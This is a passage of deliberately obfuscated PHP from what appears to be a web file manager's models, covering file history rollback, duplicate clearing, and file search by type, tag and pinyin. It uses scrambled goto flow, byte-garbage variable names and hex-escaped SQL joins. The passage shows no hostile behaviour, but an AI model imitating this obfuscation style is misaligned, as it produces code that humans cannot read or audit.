$this->_listAppendUser($c¥¯¼´«êÅ[$Fª†ñ‹˜Şà[361]]); $a”âÚ»Ôòğ = Model($Fª†ñ‹˜Şà[1087])->get($Fª†ñ‹˜Şà[1088]); goto aÜ¨®“¤±ß; d˜‘‡„¯È: } protected function _listAppendUser(&$a—æÉŞí) { $fÆ¦‚ÔÄ¾Ï =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bÇÄ‰éø£ = array_to_keyvalue($a—æÉŞí, $fÆ¦‚ÔÄ¾Ï[33], $fÆ¦‚ÔÄ¾Ï[1490]); $BÙé”ĞÓ’« = Model($fÆ¦‚ÔÄ¾Ï[494])->userListInfo($bÇÄ‰éø£); foreach ($a—æÉŞí as &$dÚ¨²È¬ÂÙ) { $B›ÆÙñö¥Ü = $dÚ¨²È¬ÂÙ[$fÆ¦‚ÔÄ¾Ï[1490]]; $dÚ¨²È¬ÂÙ[$fÆ¦‚ÔÄ¾Ï[394]] = $BÙé”ĞÓ’«[$B›ÆÙñö¥Ü] ? $BÙé”ĞÓ’«[$B›ÆÙñö¥Ü] : !1; } unset($dÚ¨²È¬ÂÙ); } public function fileInfo($f¼††Ì‰êÃ) { $BÄÃôáñöö =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Eñ‘áâÒàÕ = $this->tablePrefix; $dÅğñ‘â“È = "{$Eñ‘áâÒàÕ}\x69\x6f\x5f\x66\x69\x6c\x65\x20\x66\x69\x6c\x65\163\40\x6f\156\40\x66\151\154\145\x73\56\146\x69\x6c\145\x49\104\x20\75\x20\x68\151\163\164\157\x72\171\56\x66\151\x6c\145\x49\x44"; return $this->alias($BÄÃôáñöö[1889])->where(array($BÄÃôáñöö[401] => $f¼††Ì‰êÃ))->join($dÅğñ‘â“È, $BÄÃôáñöö[1890])->find(); } public function removeItem($Böùá•ˆ‹İ) { $aâ”ºìÚã =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Cåàªøº¹ = array($aâ”ºìÚã[401] => $Böùá•ˆ‹İ); $e›øÜ‰Œ‰ = $this->where($Cåàªøº¹)->find(); if ($e›øÜ‰Œ‰) { $AóéŒï’¬÷ = $this->where($Cåàªøº¹)->delete(); Model($aâ”ºìÚã[438])->remove($e›øÜ‰Œ‰[$aâ”ºìÚã[435]]); return $AóéŒï’¬÷; } return !1; } public function removeBySource($B™äßÇ‡¼) { goto a…Å‚£†; AÜ÷µÄ“Èô: return !0; goto d½øƒ¿òæ; a…Å‚£†: $d¿…¼…Âß =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$B™äßÇ‡¼) { return !1; } if (!is_array($B™äßÇ‡¼)) { $B™äßÇ‡¼ = array($B™äßÇ‡¼); } goto EŠëÁĞ—¦í; EŠëÁĞ—¦í: $dğöâò³Ô† = array($d¿…¼…Âß[399] => array($d¿…¼…Âß[7], $B™äßÇ‡¼)); $D‘ğŠ ‰ì˜ = $this->field($d¿…¼…Âß[436])->where($dğöâò³Ô†)->select(); if ($D‘ğŠ ‰ì˜) { $this->where($dğöâò³Ô†)->delete(); $Dº–™’·æ³ = array_to_keyvalue($D‘ğŠ ‰ì˜, $d¿…¼…Âß[33], $d¿…¼…Âß[435]); Model($d¿…¼…Âß[438])->remove($Dº–™’·æ³); } goto AÜ÷µÄ“Èô; d½øƒ¿òæ: } public function setDetail($fò¯ŞŸè´Á, $B¯Š²š´…«) { $f«å©õ¨„Â =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return $this->where(array($f«å©õ¨„Â[401] => $fò¯ŞŸè´Á))->save(array($f«å©õ¨„Â[1880] => $B¯Š²š´…«)); } public function rollbackToItem($E†°Ü‰¯”Í, $bƒ²ğ’½˜Ï) { goto AŒøèîÑ¿±; CåÌ³è¬: return $this->where(array($eÚÊ°»ßñ[401] => $bƒ²ğ’½˜Ï))->delete(); goto eäÖíñ¾Å; AŒøèîÑ¿±: $eÚÊ°»ßñ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C„ùºŒ‡Œí = Model($eÚÊ°»ßñ[759])->sourceInfo($E†°Ü‰¯”Í); $this->addHistory($C„ùºŒ‡Œí, LNG($eÚÊ°»ßñ[1891])); goto aÁ¹İã‹È»; aÁ¹İã‹È»: $FÌ´ ÜŠ»‰ = $this->find($bƒ²ğ’½˜Ï); $F„ò¡¼ÅçÀ = array($eÚÊ°»ßñ[435] => $FÌ´ ÜŠ»‰[$eÚÊ°»ßñ[435]], $eÚÊ°»ßñ[77] => $FÌ´ ÜŠ»‰[$eÚÊ°»ßñ[77]], $eÚÊ°»ßñ[107] => time(), $eÚÊ°»ßñ[395] => USER_ID); Model($eÚÊ°»ßñ[759])->where(array($eÚÊ°»ßñ[385] => $E†°Ü‰¯”Í))->save($F„ò¡¼ÅçÀ); goto CåÌ³è¬; eäÖíñ¾Å: } public function clearSame($c®÷çÇÙ²®) { goto D’Ø·‹ˆ—; D’Ø·‹ˆ—: $d–´ÀõÂ¿ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B§êˆ†¥‡Ã = $this->listData($c®÷çÇÙ²®); $D–È‘Ä„¿ = array_to_keyvalue_group($B§êˆ†¥‡Ã, $d–´ÀõÂ¿[435]); goto eè¦ôàÖƒö; E£ç ÙùŞ: if (!$d·Õ¼íøÑš) { return; } $this->where(array($d–´ÀõÂ¿[383] => array($d–´ÀõÂ¿[7], $d·Õ¼íøÑš)))->delete(); Model($d–´ÀõÂ¿[438])->remove($E¸˜‘‹’’); goto B¾’¿Š§ò“; eè¦ôàÖƒö: $E¸˜‘‹’’ = array(); $d·Õ¼íøÑš = array(); foreach ($D–È‘Ä„¿ as $a´ÔîùŒĞ») { if (!$a´ÔîùŒĞ» || count($a´ÔîùŒĞ») <= 1) { continue; } foreach ($a´ÔîùŒĞ» as $dåÃÇÀ»¢á) { $E¸˜‘‹’’[] = $dåÃÇÀ»¢á[$d–´ÀõÂ¿[435]]; $d·Õ¼íøÑš[] = $dåÃÇÀ»¢á[$d–´ÀõÂ¿[383]]; } } goto E£ç ÙùŞ; B¾’¿Š§ò“: } public function userSpace() { $CÁæ‹™ÕÚò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B¤Ãâ¼¶•Å = $this->tablePrefix; $Ağİ‡£¹ = array($CÁæ‹™ÕÚò[1482] => USER_ID); $côİÙó”“Ô = "{$B¤Ãâ¼¶•Å}\151\157\137\146\151\154\x65\x20\x66\x69\x6c\145\163\40\157\x6e\x20\x66\x69\x6c\x65\163\56\146\x69\154\x65\111\104\40\x3d\x20\150\x69\163\164\157\x72\171\56\146\151\154\x65\111\x44"; return $this->alias($CÁæ‹™ÕÚò[1889])->where($Ağİ‡£¹)->join($côİÙó”“Ô, $CÁæ‹™ÕÚò[1890])->sum($CÁæ‹™ÕÚò[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($B²™ôæ) { goto EêĞ¥àä»ç; b¯óøÜ˜Ìä: if (!$dƒÕÊå¸ß¬) { return array(); } $c²Š”èñçÏ = $dƒÕÊå¸ß¬[$D”æˆ™‹Ø[165]]; $d”ªˆ±¦èÁ = $D”æˆ™‹Ø[7]; goto dÀ˜â–Üƒè; dÀ˜â–Üƒè: if (!$dƒÕÊå¸ß¬[$D”æˆ™‹Ø[165]]) { $bÅŸ†Àáƒ© = array_to_keyvalue($b¿ª½ÍÁ¾, $D”æˆ™‹Ø[33], $D”æˆ™‹Ø[165]); $c²Š”èñçÏ = implode($D”æˆ™‹Ø[47], $bÅŸ†Àáƒ©); $d”ªˆ±¦èÁ = $D”æˆ™‹Ø[1892]; } $F¨©Ú­Ãï = explode($D”æˆ™‹Ø[47], trim($c²Š”èñçÏ, $D”æˆ™‹Ø[47])); return array($d”ªˆ±¦èÁ, $F¨©Ú­Ãï); goto c‹ğÓ¼ƒ®¤; EêĞ¥àä»ç: $D”æˆ™‹Ø =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b¿ª½ÍÁ¾ = KodIO::fileTypeList(); $dƒÕÊå¸ß¬ = $b¿ª½ÍÁ¾[$B²™ôæ]; goto b¯óøÜ˜Ìä; c‹ğÓ¼ƒ®¤: } public function listPathType($dëŒÏ£”á) { $e‡ô‰¼“òÀ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eä‘‰ÚÀ¦– = $this->fileTypeWhere($dëŒÏ£”á); if (!$eä‘‰ÚÀ¦–) { return array(); } $c‡‚˜áîÄ´ = array($e‡ô‰¼“òÀ[538] => SourceModel::TYPE_USER, $e‡ô‰¼“òÀ[539] => USER_ID, $e‡ô‰¼“òÀ[535] => 0, $e‡ô‰¼“òÀ[536] => $eä‘‰ÚÀ¦–); return $this->listSource($c‡‚˜áîÄ´); } public function listSearch($A‡ƒ’è”‘Ê, $f¤£å‘©¶ = 300) { goto C£õ¼…ğŠ; b›Œå‚Å‚£: if (!isset($E—Ü‹ëÃËí[$Dµí˜¸†®‚[413]])) { $E—Ü‹ëÃËí[$Dµí˜¸†®‚[413]] = 0; } $eõ¬„™¥® = $Dµí˜¸†®‚[1894]; $F‹™•¦·è¾ = $eõ¬„™¥®; goto D³³¦Å¥ó; D³³¦Å¥ó: $this->_listSearchBindPinyin($A‡ƒ’è”‘Ê, $E—Ü‹ëÃËí, $eõ¬„™¥®); $this->alias($Dµí˜¸†®‚[504])->_makeOrder(); $E—Ü‹ëÃËí = $this->parseWhereLike($E—Ü‹ëÃËí); goto c¢Ââ‡æÇ; c¢Ââ‡æÇ: $e¥‹Ñ¦™ªÎ = $this->distinct(!0)->field($eõ¬„™¥®)->where($E—Ü‹ëÃËí)->selectPage($f¤£å‘©¶); $this->_listSearchDesc($e¥‹Ñ¦™ªÎ, $A‡ƒ’è”‘Ê, $F‹™•¦·è¾); $this->_listSearchTag($e¥‹Ñ¦™ªÎ, $A‡ƒ’è”‘Ê, $F‹™•¦·è¾); goto föìŒ–ï‰; C£õ¼…ğŠ: $Dµí˜¸†®‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (isset($A‡ƒ’è”‘Ê[$Dµí˜¸†®‚[1735]]) && $A‡ƒ’è”‘Ê[$Dµí˜¸†®‚[1735]]) { $A‡ƒ’è”‘Ê[$Dµí˜¸†®‚[1735]] = str_replace($Dµí˜¸†®‚[374], $Dµí˜¸†®‚[1893], trim($A‡ƒ’è”‘Ê[$Dµí˜¸†®‚[1735]])); } $E—Ü‹ëÃËí = $this->_parseSearchWhere($A‡ƒ’è”‘Ê); goto b›Œå‚Å‚£; föìŒ–ï‰: $this->_listSearchGroupTag($e¥‹Ñ¦™ªÎ, $A‡ƒ’è”‘Ê, $F‹™•¦·è¾); $this->_listDataApply($e¥‹Ñ¦™ªÎ[$Dµí˜¸†®‚[361]]); $this->_listMake($e¥‹Ñ¦™ªÎ); goto c¥Ø•ç© Û; c¥Ø•ç© Û: return $e¥‹Ñ¦™ªÎ; goto bô£¬’; bô£¬’: } private function _listSearchTag(&$B†ˆÃ‰ßáø, $aµá¾” Å, $bÄˆŒ˜ÀŠ) { goto aä”÷ˆÛØ¤; A°”‘ ßù: $Cç§¸Œ = array_to_keyvalue($Cç§¸Œ, $fÎŠœáèºñ[33], $fÎŠœáèºñ[75]); $dÇ½‘‡©‹µ = array_unique($Cç§¸Œ); $this->_listSearchMerge($B†ˆÃ‰ßáø, $aµá¾” Å, $bÄˆŒ˜ÀŠ, $dÇ½‘‡©‹µ); goto fèù’ ÛÓ„; aä”÷ˆÛØ¤: $fÎŠœáèºñ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$aµá¾” Å[$fÎŠœáèºñ[1735]] || $B†ˆÃ‰ßáø[$fÎŠœáèºñ[358]][$fÎŠœáèºñ[347]] > 1) { return; } $dåÒá£Á½÷ = Model($fÎŠœáèºñ[1895])->listData(); goto eÔ÷·²‘ò†; eÔ÷·²‘ò†: $bÉÜ¢Ó‚é = array(); $b’®§ãøø = $aµá¾” Å[$fÎŠœáèºñ[1735]]; foreach ($dåÒá£Á½÷ as $Fçâä¨ŞÉ) { $D¤ôÔ©Õ°¨ = $Fçâä¨ŞÉ[$fÎŠœáèºñ[28]]; $FÕ›äÅ½Ü = str_replace($fÎŠœáèºñ[50], $fÎŠœáèºñ[33], Pinyin::encode($D¤ôÔ©Õ°¨)); if (stripos($D¤ôÔ©Õ°¨, $b’®§ãøø) !== !1 || stripos($FÕ›äÅ½Ü, $b’®§ãøø) !== !1) { $bÉÜ¢Ó‚é[] = $Fçâä¨ŞÉ[$fÎŠœáèºñ[383]]; } } goto fÖ¯˜ÎÜä; fÖ¯˜ÎÜä: if (!$bÉÜ¢Ó‚é) { return; } $e‡®¿àø‘ = array($fÎŠœáèºñ[409] => array($fÎŠœáèºñ[7], $bÉÜ¢Ó‚é), $fÎŠœáèºñ[1490] => USER_ID); $Cç§¸Œ = Model($fÎŠœáèºñ[410])->field($fÎŠœáèºñ[75])->where($e‡®¿àø‘)->select(); goto A°”‘ ßù; fèù’ ÛÓ„: } private function _listSearchDesc(&$c‰™ŒÃ¯´æ, $eæ´®¨¸¡, $F–Í³×¦Éï) { goto A‚™Åğªé¬; A‚™Åğªé¬: $C–‡‰¥Ó» =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$eæ´®¨¸¡[$C–‡‰¥Ó»[1735]] || $c‰™ŒÃ¯´æ[$C–‡‰¥Ó»[358]][$C–‡‰¥Ó»[347]] > 1) { return; } $b›„ŠĞ¶ = $this->listSearchChildren($eæ´®¨¸¡[$C–‡‰¥Ó»[478]]); goto Dö¯ÀÚ¢ñá; Dö¯ÀÚ¢ñá: $b›„ŠĞ¶ = array_unique($b›„ŠĞ¶); if (!$b›„ŠĞ¶) { return; } $cÌ‘Ñ¹‘ğÖ = array($C–‡‰¥Ó»[385] => array($C–‡‰¥Ó»[7], $b›„ŠĞ¶), $C–‡‰¥Ó»[89] => $C–‡‰¥Ó»[421], $C–‡‰¥Ó»[366] => array($C–‡‰¥Ó»[373], $C–‡‰¥Ó»[1737] . $eæ´®¨¸¡[$C–‡‰¥Ó»[1735]] . $C–‡‰¥Ó»[1737])); goto f‹¡Íª¡ğ”; f‹¡Íª¡ğ”: $Eò™Ö÷¨ƒß = Model($C–‡‰¥Ó»[521])->field($C–‡‰¥Ó»[385])->where($cÌ‘Ñ¹‘ğÖ)->select(); $cÔ¶Éˆœ²š = array_to_keyvalue($Eò™Ö÷¨ƒß, $C–‡‰¥Ó»[33], $C–‡‰¥Ó»[385]); $this->_listSearchMerge($c‰™ŒÃ¯´æ, $eæ´®¨¸¡, $F–Í³×¦Éï, $cÔ¶Éˆœ²š); goto b¢›Ûã‰«; b¢›Ûã‰«: } private function _listSearchGroupTag(&$Dâ…ÏøİÄ, $Dƒ‹¹ôƒÚ÷, $d±Û‚Ü§Õ) { goto cÍÀ­³¤Á; Eºø¬Áåƒ: $c›†š¤¯ä« = array(); $eêë‘ò×è = $Dƒ‹¹ôƒÚ÷[$AØ­±¸¶¦Ó[1735]]; foreach ($EÜ”ø«’Ó[$AØ­±¸¶¦Ó[361]] as $FÖÚ¯õÔ¤ç) { $D‹‚äšî„ = $FÖÚ¯õÔ¤ç[$AØ­±¸¶¦Ó[28]]; $E¹÷í†‘‘ñ = str_replace($AØ­±¸¶¦Ó[50], $AØ­±¸¶¦Ó[33], Pinyin::encode($D‹‚äšî„)); if (stripos($D‹‚äšî„, $eêë‘ò×è) !== !1 || stripos($E¹÷í†‘‘ñ, $eêë‘ò×è) !== !1) { $c›†š¤¯ä«[] = $FÖÚ¯õÔ¤ç[$AØ­±¸¶¦Ó[383]]; } } goto EŒšëë—Ö“; cÍÀ­³¤Á: $AØ­±¸¶¦Ó =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$Dƒ‹¹ôƒÚ÷[$AØ­±¸¶¦Ó[1735]] || $Dâ…ÏøİÄ[$AØ­±¸¶¦Ó[358]][$AØ­±¸¶¦Ó[347]] > 1 || !$Dƒ‹¹ôƒÚ÷[$AØ­±¸¶¦Ó[478]]) { return; } $cï©¨ÉÅ÷” = $this->sourceInfo($Dƒ‹¹ôƒÚ÷[$AØ­±¸¶¦Ó[478]]); goto bÄ‚Ú¸ìï ; bÄ‚Ú¸ìï : if (!$cï©¨ÉÅ÷” || $cï©¨ÉÅ÷”[$AØ­±¸¶¦Ó[387]] != SourceModel::TYPE_GROUP) { return; } $fˆ¹Øê˜åÊ = $cï©¨ÉÅ÷”[$AØ­±¸¶¦Ó[473]]; $EÜ”ø«’Ó = Model($AØ­±¸¶¦Ó[1896])->get($fˆ¹Øê˜åÊ); goto Eºø¬Áåƒ; EŒšëë—Ö“: if (!$c›†š¤¯ä«) { return; } $FÑì„ğÉÜÔ = array($AØ­±¸¶¦Ó[409] => array($AØ­±¸¶¦Ó[7], $c›†š¤¯ä«), $AØ­±¸¶¦Ó[1490] => 0, $AØ­±¸¶¦Ó[29] => $AØ­±¸¶¦Ó[1755] . $fˆ¹Øê˜åÊ); $Fñ‹§ĞÜš = Model($AØ­±¸¶¦Ó[410])->field($AØ­±¸¶¦Ó[75])->where($FÑì„ğÉÜÔ)->select(); goto fÛ´ ÄòÕ¤; fÛ´ ÄòÕ¤: $Fñ‹§ĞÜš = array_to_keyvalue($Fñ‹§ĞÜš, $AØ­±¸¶¦Ó[33], $AØ­±¸¶¦Ó[75]); $C–¤áòïÒ¬ = array_unique($Fñ‹§ĞÜš); $this->_listSearchMerge($Dâ…ÏøİÄ, $Dƒ‹¹ôƒÚ÷, $d±Û‚Ü§Õ, $C–¤áòïÒ¬); goto cÆª´ÎÉìŒ; cÆª´ÎÉìŒ: } private function _listSearchMerge(&$e­ÉŸ¶´œŒ, $FõÄİ´İ¼°, $e†”™à°‚¦, $d¿Š†« †¬) { goto C‚¤á ÌÂá; C‚¤á ÌÂá: $fè“‘ÀÄ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$d¿Š†« †¬) { return; } $E„™‘áî’› = array_to_keyvalue($e­ÉŸ¶´œŒ[$fè“‘ÀÄ[361]], $fè“‘ÀÄ[33], $fè“‘ÀÄ[385]); goto EÖ›‡°·›; bÃÊÏ´­Ô: foreach ($c™ìÑˆÜ as $C¨Â‘Ëõ¾İ) { $b ÊµÊîÈæ = $fè“‘ÀÄ[47] . $FõÄİ´İ¼°[$fè“‘ÀÄ[478]] . $fè“‘ÀÄ[47]; if (stripos($C¨Â‘Ëõ¾İ[$fè“‘ÀÄ[476]], $b ÊµÊîÈæ) !== !1) { $Bñ¦¼÷İÅ[] = $C¨Â‘Ëõ¾İ; } } $e­ÉŸ¶´œŒ[$fè“‘ÀÄ[361]] = array_merge($Bñ¦¼÷İÅ, $e­ÉŸ¶´œŒ[$fè“‘ÀÄ[361]]); $e­ÉŸ¶´œŒ[$fè“‘ÀÄ[358]][$fè“‘ÀÄ[359]] += count($Bñ¦¼÷İÅ); goto f²‹ˆºÖ¬Ô; DØÖéºùàÃ: $c™ìÑˆÜ = $this->field($e†”™à°‚¦)->where($fä†÷‘˜²)->select(); if (!$c™ìÑˆÜ) { return; } $Bñ¦¼÷İÅ = array(); goto bÃÊÏ´­Ô; EÖ›‡°·›: $B¯ËÈ»ˆ¶ = array_diff($d¿Š†« †¬, $E„™‘áî’›); if (!$B¯ËÈ»ˆ¶) { return; } $fä†÷‘˜² = array($fè“‘ÀÄ[385] => array($fè“‘ÀÄ[7], $B¯ËÈ»ˆ¶)); goto DØÖéºùàÃ; f²‹ˆºÖ¬Ô: } public function listSearchChildren($Aô…ï˜œ†, $a¶Ë¼¡Áœæ = 5000) { goto f©«‡ ”Õ£; b•“·‡œ …: $E†ÏØÑšõ” = array($C¯Ì´Ø§å¯[476] => array($C¯Ì´Ø§å¯[373], $EéÜº‡›Ä“[$C¯Ì´Ø§å¯[476]] . $EéÜº‡›Ä“[$C¯Ì´Ø§å¯[385]] . $C¯Ì´Ø§å¯[501])); $cÀÖ‚—ï¥¢ = $this->field($C¯Ì´Ø§å¯[385])->cache(null, 600)->where($E†ÏØÑšõ”)->count(); if ($cÀÖ‚—ï¥¢ > $a¶Ë¼¡Áœæ) { return $this->_listSearchChildrenNear($Aô…ï˜œ†, $a¶Ë¼¡Áœæ); } goto DìÈ®öŒ÷; DìÈ®öŒ÷: $A½¤ãÍÑÍ = $this->field($C¯Ì´Ø§å¯[385])->where($E†ÏØÑšõ”)->select(); $eø×Ç¾Ï”ä = array_to_keyvalue($A½¤ãÍÑÍ, $C¯Ì´Ø§å¯[33], $C¯Ì´Ø§å¯[385]); return $eø×Ç¾Ï”ä; goto C§”¦´Ø‚È; f©«‡ ”Õ£: $C¯Ì´Ø§å¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eø×Ç¾Ï”ä = array(); $EéÜº‡›Ä“ = $this->sourceInfo($Aô…ï˜œ†); goto b•“·‡œ …; C§”¦´Ø‚È: } private function _listSearchChildrenNear($eºî¦èÇ, $BÆÄÏ«éÛ) { goto CÖî¨Šğ™Ï; fùÇ¶ã½Á¶: $B”Úİ³öç = $this->field($C¿¨¡—ëÈ¦[1897])->where($E‘ãâ¶×æÀ)->select(); $A¥˜¤àÇª = array_to_keyvalue(array_filter_by_field($B”Úİ³öç, $C¿¨¡—ëÈ¦[386], $C¿¨¡—ëÈ¦[83]), $C¿¨¡—ëÈ¦[33], $C¿¨¡—ëÈ¦[385]); $Dà—–Ê“¶¡ = array_merge($Dà—–Ê“¶¡, array_to_keyvalue($B”Úİ³öç, $C¿¨¡—ëÈ¦[33], $C¿¨¡—ëÈ¦[385])); goto d¹ˆã…®ìÅ; CÖî¨Šğ™Ï: $C¿¨¡—ëÈ¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Dà—–Ê“¶¡ = array(); $E‘ãâ¶×æÀ = array($C¿¨¡—ëÈ¦[478] => $eºî¦èÇ); goto fùÇ¶ã½Á¶; d¹ˆã…®ìÅ: if (!$A¥˜¤àÇª) { return $Dà—–Ê“¶¡; } $E‘ãâ¶×æÀ = array($C¿¨¡—ëÈ¦[478] => array($C¿¨¡—ëÈ¦[7], $A¥˜¤àÇª)); $B”Úİ³öç = $this->field($C¿¨¡—ëÈ¦[1897])->where($E‘ãâ¶×æÀ)->limit($BÆÄÏ«éÛ)->select(); goto bô‹¨Š×—œ; bô‹¨Š×—œ: $Dà—–Ê“¶¡ = array_merge($Dà—–Ê“¶¡, array_to_keyvalue($B”Úİ³öç, $C¿¨¡—ëÈ¦[33], $C¿¨¡—ëÈ¦[385])); $Dà—–Ê“¶¡ = array_slice($Dà—–Ê“¶¡, 0, $BÆÄÏ«éÛ); return $Dà—–Ê“¶¡; goto A®“ª–­Â¨; A®“ª–­Â¨: } private function _listSearchBindPinyin($cãÚŸ×Ğİ•, &$F…ˆ¶ùéÓØ, &$cµŞ£¯µ™) { goto C²İñ¸¸õ¨; Cöé×™å¼—: foreach ($aÙÅ‡×À‹Œ as $Có´á¿Ë¹Õ) { $c±àÛ–˜ò[] = array($BñŒ·ÏÖ×[1901] => $Có´á¿Ë¹Õ, $BñŒ·ÏÖ×[922] => $BñŒ·ÏÖ×[1739], array($BñŒ·ÏÖ×[1902] => $Có´á¿Ë¹Õ, $BñŒ·ÏÖ×[1903] => array($BñŒ·ÏÖ×[7], array($BñŒ·ÏÖ×[432], $BñŒ·ÏÖ×[431])))); } $this->join($cŠ”‘Ê©³); $F…ˆ¶ùéÓØ = $c±àÛ–˜ò; goto e¸àâí¸Ëñ; aßÅ‰ÇÀô¤: $aÙÅ‡×À‹Œ = $F…ˆ¶ùéÓØ[$BñŒ·ÏÖ×[28]]; unset($F…ˆ¶ùéÓØ[$BñŒ·ÏÖ×[28]]); foreach ($F…ˆ¶ùéÓØ as $E§ê“¯£Êã => $cºš›…ğˆ) { $c±àÛ–˜ò[$BñŒ·ÏÖ×[1899] . $E§ê“¯£Êã] = $cºš›…ğˆ; } goto Cöé×™å¼—; C²İñ¸¸õ¨: $BñŒ·ÏÖ× =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!Input::check($cãÚŸ×Ğİ•[$BñŒ·ÏÖ×[1735]], $BñŒ·ÏÖ×[312]) || strlen($cãÚŸ×Ğİ•[$BñŒ·ÏÖ×[1735]]) < 2) { return; } $cŠ”‘Ê©³ = "\114\105\x46\124\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\x69\157\137\x73\x6f\x75\162\x63\145\137\x6d\x65\164\141\40\155\145\164\141\x20\x6f\156\40\x73\x6f\x75\x72\x63\145\x2e\163\x6f\165\x72\x63\145\x49\x44\40\x3d\x20\155\145\164\141\56\163\x6f\x75\x72\143\x65\111\x44"; goto A³ŞàˆĞá¼; A³ŞàˆĞá¼: $c±àÛ–˜ò = array(); $cµŞ£¯µ™ = str_replace(array($BñŒ·ÏÖ×[225], $BñŒ·ÏÖ×[50], $BñŒ·ÏÖ×[1898]), $BñŒ·ÏÖ×[33], $cµŞ£¯µ™); $cµŞ£¯µ™ = $BñŒ·ÏÖ×[1899] . str_replace($BñŒ·ÏÖ×[47], $BñŒ·ÏÖ×[1900], $cµŞ£¯µ™); goto aßÅ‰ÇÀô¤; e¸àâí¸Ëñ: } private function _parseSearchWhere($E´ñ½›š») { goto aÓÍÅ½éğ; aÓÍÅ½éğ: $B±ÅÏÁÄî =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dŸ™ª§ÒÇ˜ = array(); if (isset($E´ñ½›š»[$B±ÅÏÁÄî[710]])) { $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[107]] = array($B±ÅÏÁÄî[1904], $E´ñ½›š»[$B±ÅÏÁÄî[710]]); } goto E®óì¬½¯ƒ; Eİ‹¯ÛÕ»´: if (isset($E´ñ½›š»[$B±ÅÏÁÄî[551]])) { $dŸ™ª§ÒÇ˜[] = array($B±ÅÏÁÄî[395] => $E´ñ½›š»[$B±ÅÏÁÄî[551]], $B±ÅÏÁÄî[394] => $E´ñ½›š»[$B±ÅÏÁÄî[551]], $B±ÅÏÁÄî[922] => $B±ÅÏÁÄî[1739]); } if (isset($E´ñ½›š»[$B±ÅÏÁÄî[388]])) { $B¶äÔì«ƒ‹ = $E´ñ½›š»[$B±ÅÏÁÄî[388]]; if ($B¶äÔì«ƒ‹ == $B±ÅÏÁÄî[76]) { $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[386]] = 1; } else { if ($B¶äÔì«ƒ‹ == $B±ÅÏÁÄî[1909]) { $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[386]] = 0; } else { if ($B¶äÔì«ƒ‹) { $B¶äÔì«ƒ‹ = is_array($B¶äÔì«ƒ‹) ? $B¶äÔì«ƒ‹ : explode($B±ÅÏÁÄî[47], $B¶äÔì«ƒ‹); $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[388]] = array($B±ÅÏÁÄî[400], $B¶äÔì«ƒ‹); $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[386]] = 0; } } } } if (isset($E´ñ½›š»[$B±ÅÏÁÄî[478]])) { $d‘šïì‚«¶ = $this->sourceInfo($E´ñ½›š»[$B±ÅÏÁÄî[478]]); $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[542]] = array($B±ÅÏÁÄî[500], $d‘šïì‚«¶[$B±ÅÏÁÄî[476]] . $E´ñ½›š»[$B±ÅÏÁÄî[478]] . $B±ÅÏÁÄî[501]); } goto Fè ‘ÉØÎŸ; E®óì¬½¯ƒ: if (isset($E´ñ½›š»[$B±ÅÏÁÄî[464]])) { $C¯Ù‰¾é± = array($B±ÅÏÁÄî[1905], $E´ñ½›š»[$B±ÅÏÁÄî[464]]); if ($dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[107]]) { $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[107]] = array($dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[107]], $C¯Ù‰¾é±, $B±ÅÏÁÄî[1906]); } else { $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[107]] = $C¯Ù‰¾é±; } } if (isset($E´ñ½›š»[$B±ÅÏÁÄî[1907]])) { $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[77]] = array($B±ÅÏÁÄî[1904], $E´ñ½›š»[$B±ÅÏÁÄî[1907]]); } if (isset($E´ñ½›š»[$B±ÅÏÁÄî[1908]])) { $C¯Ù‰¾é± = array($B±ÅÏÁÄî[1905], $E´ñ½›š»[$B±ÅÏÁÄî[1908]]); if ($dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[77]]) { $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[77]] = array($dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[77]], $C¯Ù‰¾é±, $B±ÅÏÁÄî[1906]); } else { $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[77]] = $C¯Ù‰¾é±; } } goto Eİ‹¯ÛÕ»´; Fè ‘ÉØÎŸ: if (isset($E´ñ½›š»[$B±ÅÏÁÄî[1735]]) && $E´ñ½›š»[$B±ÅÏÁÄî[1735]]) { $eí¢ÌÃ÷‘³ = $E´ñ½›š»[$B±ÅÏÁÄî[1735]]; $fğ¬‘‚‰ = explode($B±ÅÏÁÄî[50], $eí¢ÌÃ÷‘³); if (strlen($eí¢ÌÃ÷‘³) > 2 && (substr($eí¢ÌÃ÷‘³, 0, 1) == $B±ÅÏÁÄî[113] && substr($eí¢ÌÃ÷‘³, -1) == $B±ÅÏÁÄî[113]) || substr($eí¢ÌÃ÷‘³, 0, 1) == $B±ÅÏÁÄî[55] && substr($eí¢ÌÃ÷‘³, -1) == $B±ÅÏÁÄî[55]) { $eí¢ÌÃ÷‘³ = substr($eí¢ÌÃ÷‘³, 1, -1); $fğ¬‘‚‰ = 